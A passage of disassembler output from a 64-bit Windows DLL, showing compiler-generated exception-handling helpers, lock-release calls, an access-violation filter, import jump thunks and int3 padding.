   180008922:	84 f6                	test   %dh,%dh
   180008924:	74 0b                	je     0x180008931
   180008926:	c1 ea 10             	shr    $0x10,%edx
   180008929:	84 d2                	test   %dl,%dl
   18000892b:	74 04                	je     0x180008931
   18000892d:	84 f6                	test   %dh,%dh
   18000892f:	75 88                	jne    0x1800088b9
   180008931:	48 33 c0             	xor    %rax,%rax
   180008934:	c3                   	ret
   180008935:	cc                   	int3
   180008936:	ff 25 3c 07 00 00    	jmp    *0x73c(%rip)        # 0x180009078
   18000893c:	ff 25 3e 07 00 00    	jmp    *0x73e(%rip)        # 0x180009080
   180008942:	ff 25 60 07 00 00    	jmp    *0x760(%rip)        # 0x1800090a8
   180008948:	cc                   	int3
   180008949:	cc                   	int3
   18000894a:	cc                   	int3
   18000894b:	cc                   	int3
   18000894c:	cc                   	int3
   18000894d:	cc                   	int3
   18000894e:	cc                   	int3
   18000894f:	cc                   	int3
   180008950:	40 55                	rex push %rbp
   180008952:	48 83 ec 20          	sub    $0x20,%rsp
   180008956:	48 8b ea             	mov    %rdx,%rbp
   180008959:	48 83 7d 40 00       	cmpq   $0x0,0x40(%rbp)
   18000895e:	75 0f                	jne    0x18000896f
   180008960:	83 3d 19 38 00 00 ff 	cmpl   $0xffffffff,0x3819(%rip)        # 0x18000c180
   180008967:	74 06                	je     0x18000896f
   180008969:	e8 ca 9f ff ff       	call   0x180002938
   18000896e:	90                   	nop
   18000896f:	48 83 c4 20          	add    $0x20,%rsp
   180008973:	5d                   	pop    %rbp
   180008974:	c3                   	ret
   180008975:	cc                   	int3
   180008976:	40 55                	rex push %rbp
   180008978:	48 83 ec 20          	sub    $0x20,%rsp
   18000897c:	48 8b ea             	mov    %rdx,%rbp
   18000897f:	48 8b 01             	mov    (%rcx),%rax
   180008982:	48 8b d1             	mov    %rcx,%rdx
   180008985:	8b 08                	mov    (%rax),%ecx
   180008987:	e8 88 b3 ff ff       	call   0x180003d14
   18000898c:	90                   	nop
   18000898d:	48 83 c4 20          	add    $0x20,%rsp
   180008991:	5d                   	pop    %rbp
   180008992:	c3                   	ret
   180008993:	cc                   	int3
   180008994:	40 55                	rex push %rbp
   180008996:	48 83 ec 20          	sub    $0x20,%rsp
   18000899a:	48 8b ea             	mov    %rdx,%rbp
   18000899d:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1800089a2:	e8 39 d3 ff ff       	call   0x180005ce0
   1800089a7:	90                   	nop
   1800089a8:	48 83 c4 20          	add    $0x20,%rsp
   1800089ac:	5d                   	pop    %rbp
   1800089ad:	c3                   	ret
   1800089ae:	cc                   	int3
   1800089af:	cc                   	int3
   1800089b0:	cc                   	int3
   1800089b1:	cc                   	int3
   1800089b2:	cc                   	int3
   1800089b3:	cc                   	int3
   1800089b4:	40 55                	rex push %rbp
   1800089b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800089ba:	48 8b ea             	mov    %rdx,%rbp
   1800089bd:	b9 0c 00 00 00       	mov    $0xc,%ecx
   1800089c2:	e8 19 d3 ff ff       	call   0x180005ce0
   1800089c7:	90                   	nop
   1800089c8:	48 83 c4 20          	add    $0x20,%rsp
   1800089cc:	5d                   	pop    %rbp
   1800089cd:	c3                   	ret
   1800089ce:	cc                   	int3
   1800089cf:	40 55                	rex push %rbp
   1800089d1:	48 83 ec 20          	sub    $0x20,%rsp
   1800089d5:	48 8b ea             	mov    %rdx,%rbp
   1800089d8:	83 bd 80 00 00 00 00 	cmpl   $0x0,0x80(%rbp)
   1800089df:	74 0b                	je     0x1800089ec
   1800089e1:	b9 08 00 00 00       	mov    $0x8,%ecx
   1800089e6:	e8 f5 d2 ff ff       	call   0x180005ce0
   1800089eb:	90                   	nop
   1800089ec:	48 83 c4 20          	add    $0x20,%rsp
   1800089f0:	5d                   	pop    %rbp
   1800089f1:	c3                   	ret
   1800089f2:	cc                   	int3
   1800089f3:	40 55                	rex push %rbp
   1800089f5:	48 83 ec 20          	sub    $0x20,%rsp
   1800089f9:	48 8b ea             	mov    %rdx,%rbp
   1800089fc:	8b 4d 50             	mov    0x50(%rbp),%ecx
   1800089ff:	e8 30 e0 ff ff       	call   0x180006a34
   180008a04:	90                   	nop
   180008a05:	48 83 c4 20          	add    $0x20,%rsp
   180008a09:	5d                   	pop    %rbp
   180008a0a:	c3                   	ret
   180008a0b:	cc                   	int3
   180008a0c:	40 55                	rex push %rbp
   180008a0e:	48 83 ec 20          	sub    $0x20,%rsp
   180008a12:	48 8b ea             	mov    %rdx,%rbp
   180008a15:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180008a1a:	e8 c1 d2 ff ff       	call   0x180005ce0
   180008a1f:	90                   	nop
   180008a20:	48 83 c4 20          	add    $0x20,%rsp
   180008a24:	5d                   	pop    %rbp
   180008a25:	c3                   	ret
   180008a26:	cc                   	int3
   180008a27:	40 55                	rex push %rbp
   180008a29:	48 83 ec 20          	sub    $0x20,%rsp
   180008a2d:	48 8b ea             	mov    %rdx,%rbp
   180008a30:	b9 0c 00 00 00       	mov    $0xc,%ecx
   180008a35:	e8 a6 d2 ff ff       	call   0x180005ce0
   180008a3a:	90                   	nop
   180008a3b:	48 83 c4 20          	add    $0x20,%rsp
   180008a3f:	5d                   	pop    %rbp
   180008a40:	c3                   	ret
   180008a41:	cc                   	int3
   180008a42:	cc                   	int3
   180008a43:	cc                   	int3
   180008a44:	cc                   	int3
   180008a45:	cc                   	int3
   180008a46:	cc                   	int3
   180008a47:	cc                   	int3
   180008a48:	cc                   	int3
   180008a49:	cc                   	int3
   180008a4a:	cc                   	int3
   180008a4b:	cc                   	int3
   180008a4c:	cc                   	int3
   180008a4d:	cc                   	int3
   180008a4e:	cc                   	int3
   180008a4f:	cc                   	int3
   180008a50:	40 55                	rex push %rbp
   180008a52:	48 83 ec 20          	sub    $0x20,%rsp
   180008a56:	48 8b ea             	mov    %rdx,%rbp
   180008a59:	48 8b 01             	mov    (%rcx),%rax
   180008a5c:	33 c9                	xor    %ecx,%ecx
   180008a5e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   180008a64:	0f 94 c1             	sete   %cl
   180008a67:	8b c1                	mov    %ecx,%eax
   180008a69:	8b c1                	mov    %ecx,%eax
   180008a6b:	48 83 c4 20          	add    $0x20,%rsp
   180008a6f:	5d                   	pop    %rbp
   180008a70:	c3                   	ret
   180008a71:	cc                   	int3
   180008a72:	40 55                	rex push %rbp
   180008a74:	48 83 ec 20          	sub    $0x20,%rsp
   180008a78:	48 8b ea             	mov    %rdx,%rbp
   180008a7b:	48 8b 0d 9e 45 00 00 	mov    0x459e(%rip),%rcx        # 0x18000d020
   180008a82:	ff 15 28 07 00 00    	call   *0x728(%rip)        # 0x1800091b0
   180008a88:	90                   	nop
   180008a89:	48 83 c4 20          	add    $0x20,%rsp
   180008a8d:	5d                   	pop    %rbp
   180008a8e:	c3                   	ret
   180008a8f:	cc                   	int3
   180008a90:	40 55                	rex push %rbp
   180008a92:	48 83 ec 20          	sub    $0x20,%rsp
   180008a96:	48 8b ea             	mov    %rdx,%rbp
   180008a99:	83 7d 60 00          	cmpl   $0x0,0x60(%rbp)
   180008a9d:	74 08                	je     0x180008aa7
   180008a9f:	33 c9                	xor    %ecx,%ecx
   180008aa1:	e8 3a d2 ff ff       	call   0x180005ce0
   180008aa6:	90                   	nop
   180008aa7:	48 83 c4 20          	add    $0x20,%rsp
   180008aab:	5d                   	pop    %rbp
   180008aac:	c3                   	ret
   180008aad:	cc                   	int3
   180008aae:	40 55                	rex push %rbp
   180008ab0:	48 83 ec 20          	sub    $0x20,%rsp
   180008ab4:	48 8b ea             	mov    %rdx,%rbp
   180008ab7:	e8 28 a4 ff ff       	call   0x180002ee4
   180008abc:	90                   	nop
   180008abd:	48 83 c4 20          	add    $0x20,%rsp
   180008ac1:	5d                   	pop    %rbp
   180008ac2:	c3                   	ret
   180008ac3:	cc                   	int3
   180008ac4:	40 55                	rex push %rbp
   180008ac6:	48 83 ec 20          	sub    $0x20,%rsp
   180008aca:	48 8b ea             	mov    %rdx,%rbp
   180008acd:	b9 0a 00 00 00       	mov    $0xa,%ecx
   180008ad2:	e8 09 d2 ff ff       	call   0x180005ce0
   180008ad7:	90                   	nop
   180008ad8:	48 83 c4 20          	add    $0x20,%rsp
   180008adc:	5d                   	pop    %rbp
   180008add:	c3                   	ret
   180008ade:	cc                   	int3
   180008adf:	40 55                	rex push %rbp
   180008ae1:	48 83 ec 20          	sub    $0x20,%rsp
   180008ae5:	48 8b ea             	mov    %rdx,%rbp
   180008ae8:	b9 01 00 00 00       	mov    $0x1,%ecx
   180008aed:	e8 ee d1 ff ff       	call   0x180005ce0
   180008af2:	90                   	nop
   180008af3:	48 83 c4 20          	add    $0x20,%rsp
   180008af7:	5d                   	pop    %rbp
   180008af8:	c3                   	ret
   180008af9:	cc                   	int3
   180008afa:	40 55                	rex push %rbp
   180008afc:	48 83 ec 20          	sub    $0x20,%rsp
   180008b00:	48 8b ea             	mov    %rdx,%rbp
   180008b03:	48 63 4d 20          	movslq 0x20(%rbp),%rcx
   180008b07:	48 8b c1             	mov    %rcx,%rax
   180008b0a:	48 8b 15 d7 58 00 00 	mov    0x58d7(%rip),%rdx        # 0x18000e3e8
   180008b11:	48 8b 14 ca          	mov    (%rdx,%rcx,8),%rdx
   180008b15:	e8 26 bf ff ff       	call   0x180004a40
   180008b1a:	90                   	nop
   180008b1b:	48 83 c4 20          	add    $0x20,%rsp
   180008b1f:	5d                   	pop    %rbp
   180008b20:	c3                   	ret
   180008b21:	cc                   	int3
   180008b22:	cc                   	int3
   180008b23:	cc                   	int3
   180008b24:	cc                   	int3
   180008b25:	cc                   	int3
   180008b26:	cc                   	int3
   180008b27:	cc                   	int3
   180008b28:	cc                   	int3
   180008b29:	cc                   	int3
   180008b2a:	40 55                	rex push %rbp
   180008b2c:	48 83 ec 20          	sub    $0x20,%rsp
   180008b30:	48 8b ea             	mov    %rdx,%rbp
   180008b33:	b9 01 00 00 00       	mov    $0x1,%ecx
   180008b38:	e8 a3 d1 ff ff       	call   0x180005ce0
   180008b3d:	90                   	nop
   180008b3e:	48 83 c4 20          	add    $0x20,%rsp
   180008b42:	5d                   	pop    %rbp
   180008b43:	c3                   	ret
   180008b44:	cc                   	int3
   180008b45:	40 55                	rex push %rbp
   180008b47:	48 83 ec 20          	sub    $0x20,%rsp
   180008b4b:	48 8b ea             	mov    %rdx,%rbp
   180008b4e:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   180008b52:	e8 9d be ff ff       	call   0x1800049f4
   180008b57:	90                   	nop
   180008b58:	48 83 c4 20          	add    $0x20,%rsp
   180008b5c:	5d                   	pop    %rbp
   180008b5d:	c3                   	ret
   180008b5e:	cc                   	int3
   180008b5f:	40 55                	rex push %rbp
   180008b61:	48 83 ec 20          	sub    $0x20,%rsp
   180008b65:	48 8b ea             	mov    %rdx,%rbp
   180008b68:	8b 4d 40             	mov    0x40(%rbp),%ecx
   180008b6b:	e8 c4 de ff ff       	call   0x180006a34
   180008b70:	90                   	nop
   180008b71:	48 83 c4 20          	add    $0x20,%rsp
   180008b75:	5d                   	pop    %rbp
   180008b76:	c3                   	ret
   180008b77:	cc                   	int3
